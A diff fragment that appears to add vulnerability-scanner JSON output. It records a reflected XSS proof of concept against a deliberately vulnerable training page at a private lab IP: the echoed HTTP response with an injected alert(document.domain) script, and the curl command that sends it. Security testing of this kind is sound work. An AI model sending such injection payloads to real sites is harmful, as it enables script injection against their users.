+      "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 674\r\nContent-Type: text/html; charset=UTF-8\r\nDate: Tue, 30 Dec 2025 10:27:53 GMT\r\nServer: Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3\r\nX-Powered-By: PHP/5.6.21\r\n\r\n<!DOCTYPE html>\n<html>\n<head>\n   <title>XSS 1</title>\n<link rel=\"shortcut icon\" href=\"../Resources/hmbct.png\" />\n</head>\n<body>\n\t\n\t <div style=\"background-color:#c9c9c9;padding:15px;\">\n      <button type=\"button\" name=\"homeButton\" onclick=\"location.href='../homepage.html';\">Home Page</button>\n      <button type=\"button\" name=\"mainButton\" onclick=\"location.href='xssmainpage.html';\">Main Page</button>\n    </div>\n<div align=\"center\">\n   <form method=\"GET\" action=\"\" name=\"form\">\n   <p>Your name:<input type=\"text\" name=\"username\"></p>\n   <input type=\"submit\" name=\"submit\" value=\"Submit\">\n</form>\n\t</div>\nYour name is <script>alert(document.domain)</script></body>\n</html>\n",
+      "curlCommand": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0' 'http://192.168.64.2:9991/www/XSS/XSS_level1.php/create_user/?username=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E'",
+      "ip": "192.168.64.2"
+    }
+  ]
+}
